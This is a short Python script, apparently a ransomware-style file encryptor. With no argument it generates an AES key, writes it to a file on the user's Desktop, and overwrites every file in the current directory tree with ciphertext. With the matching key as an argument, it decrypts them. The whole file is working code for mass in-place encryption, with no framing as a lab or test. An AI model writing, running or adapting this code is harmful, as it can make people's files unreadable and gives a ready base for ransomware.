import os
import sys
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

internal_key = None

def save_key_to_file(key, key_file):
    with open(key_file, 'w') as file:
        file.write(key)

def load_key_from_file(key_file):
    with open(key_file, 'rb') as key_file:
        return key_file.read()

def encrypt_file(key, file_path):
    cipher = AES.new(key, AES.MODE_EAX)
    try:
        if file_path == sys.argv[0]:
            return
        with open(file_path, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        print(f"File not found: {file_path}")
        return
    except PermissionError:
        print(f"Permission denied: {file_path}")
        return
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(file_path, 'wb') as file:
        [file.write(x) for x in (cipher.nonce, tag, ciphertext)]

def decrypt_file(key, file_path):
    try:
        if file_path == sys.argv[0]:
            return
        with open(file_path, 'rb') as file:
            nonce, tag, ciphertext = [file.read(x) for x in (16, 16, -1)]
    except FileNotFoundError:
        print(f"File not found: {file_path}")
        return
    except PermissionError:
        print(f"Permission denied: {file_path}")
        return

    cipher = AES.new(key, AES.MODE_EAX, nonce)
    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)

    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

def process_directory(directory, key, mode):
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if mode == 'encrypt':
                encrypt_file(key, file_path)
                print(f"Encrypted: {file_path}")
            elif mode == 'decrypt':
                decrypt_file(key, file_path)
                print(f"Decrypted: {file_path}")

if __name__ == "__main__":
    path = os.path.join(os.path.expanduser("~"), "Desktop", "encryption_key.txt")
    if len(sys.argv) == 2:
        user_key = sys.argv[1]
        if not os.path.isfile(path):
            print("Not encrypted")
            sys.exit(1)
        elif user_key != str(load_key_from_file(path), "utf-8"):
            print("Invalid decryption key.")
            sys.exit(1)
        mode = 'decrypt'
    else:
        mode = 'encrypt'
    if mode == 'encrypt' and internal_key is None:
        print("No encryption key provided.")
        internal_key = get_random_bytes(16)  # 16 bytes = 128 bits
        print(internal_key)
        print(base64.b64encode(internal_key).decode())
        save_key_to_file(base64.b64encode(internal_key).decode(), path)
    process_directory(os.getcwd(), load_key_from_file(path), mode)